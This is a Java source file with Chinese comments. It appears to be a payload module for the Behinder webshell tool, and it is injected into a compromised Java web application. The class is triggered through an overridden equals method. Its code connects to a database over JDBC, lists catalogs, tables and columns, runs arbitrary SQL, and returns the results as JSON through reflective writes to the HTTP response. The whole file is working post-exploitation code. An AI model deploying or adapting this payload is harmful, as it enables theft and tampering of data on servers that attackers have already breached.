// JDBC 数据库载荷（纯 JDK，java.sql.*）：behinder-java 通道发送。
// 操作 o：test=连通测试 / catalogs=库列表 / tables=表列表(参数 b=库) / columns=列(参数 b=库、t=表)
//         / exec=执行 SQL(参数 s，SELECT 出前 200 行)。
// 输出：JSON。可选 d=驱动类名（Class.forName 预载，目标应用自带驱动 jar 时用）。
// 约束：默认包、全反射回显、单 class、零跨类引用、占位值唯一。
public class WsmDb {

	public static final String u = "WSMDB-U0"; // JDBC URL
	public static final String n = "WSMDB-N0"; // 用户名
	public static final String p = "WSMDB-P0"; // 密码
	public static final String o = "WSMDB-O0"; // 操作
	public static final String b = "WSMDB-B0"; // 库名（tables/columns）
	public static final String t = "WSMDB-T0"; // 表名（columns）
	public static final String s = "WSMDB-S0"; // SQL（exec）
	public static final String d = "WSMDB-D0"; // 驱动类名（可空）

	public boolean equals(Object ctx) {
		try {
			String out;
			try { out = go(); }
			catch (Throwable e) { out = "{\"error\":" + q(String.valueOf(e)) + "}"; }
			write(respOf(ctx), out);
		} catch (Throwable ignored) {}
		return true;
	}

	String go() throws Exception {
		if (d != null && d.length() > 0) {
			try { Class.forName(d); } catch (Throwable ignored) {}
		}
		java.sql.Connection c = java.sql.DriverManager.getConnection(u, n, p);
		try {
			if ("test".equals(o)) {
				return "{\"ok\":true,\"product\":" + q(c.getMetaData().getDatabaseProductName() + " " + c.getMetaData().getDatabaseProductVersion()) + "}";
			}
			if ("catalogs".equals(o)) {
				StringBuilder sb = new StringBuilder("[");
				java.sql.ResultSet r = c.getMetaData().getCatalogs();
				while (r.next()) { if (sb.length() > 1) sb.append(","); sb.append(q(r.getString(1))); }
				r.close();
				return sb.append("]").toString();
			}
			if ("tables".equals(o)) {
				StringBuilder sb = new StringBuilder("[");
				java.sql.ResultSet r = c.getMetaData().getTables(b, null, "%", new String[]{ "TABLE", "VIEW" });
				while (r.next()) {
					if (sb.length() > 1) sb.append(",");
					sb.append("{\"name\":").append(q(r.getString("TABLE_NAME")))
						.append(",\"type\":").append(q(r.getString("TABLE_TYPE"))).append("}");
				}
				r.close();
				return sb.append("]").toString();
			}
			if ("columns".equals(o)) {
				StringBuilder sb = new StringBuilder("[");
				java.sql.ResultSet r = c.getMetaData().getColumns(b, null, t, "%");
				while (r.next()) {
					if (sb.length() > 1) sb.append(",");
					sb.append("{\"name\":").append(q(r.getString("COLUMN_NAME")))
						.append(",\"type\":").append(q(r.getString("TYPE_NAME")))
						.append(",\"nullable\":").append(r.getInt("NULLABLE") == 1)
						.append(",\"size\":").append(r.getInt("COLUMN_SIZE")).append("}");
				}
				r.close();
				return sb.append("]").toString();
			}
			if ("exec".equals(o)) {
				java.sql.Statement st = c.createStatement();
				boolean has = st.execute(s);
				if (!has) return "{\"affected\":" + st.getUpdateCount() + "}";
				java.sql.ResultSet r = st.getResultSet();
				StringBuilder sb = new StringBuilder("{\"cols\":[");
				java.sql.ResultSetMetaData md = r.getMetaData();
				for (int i = 1; i <= md.getColumnCount(); i++) {
					if (i > 1) sb.append(",");
					sb.append(q(md.getColumnLabel(i)));
				}
				sb.append("],\"rows\":[");
				int rows = 0;
				while (r.next() && rows < 200) {
					if (rows > 0) sb.append(",");
					sb.append("[");
					for (int i = 1; i <= md.getColumnCount(); i++) {
						if (i > 1) sb.append(",");
						Object v = r.getObject(i);
						sb.append(v == null ? "null" : q(String.valueOf(v)));
					}
					sb.append("]");
					rows++;
				}
				r.close();
				st.close();
				return sb.append("]").append(rows >= 200 ? ",\"truncated\":true" : "").append("}").toString();
			}
			throw new Exception("unknown op " + o);
		} finally {
			try { c.close(); } catch (Throwable ignored) {}
		}
	}

	static String q(String s) {
		return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t") + "\"";
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 1 ? a[1] : null;
		}
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
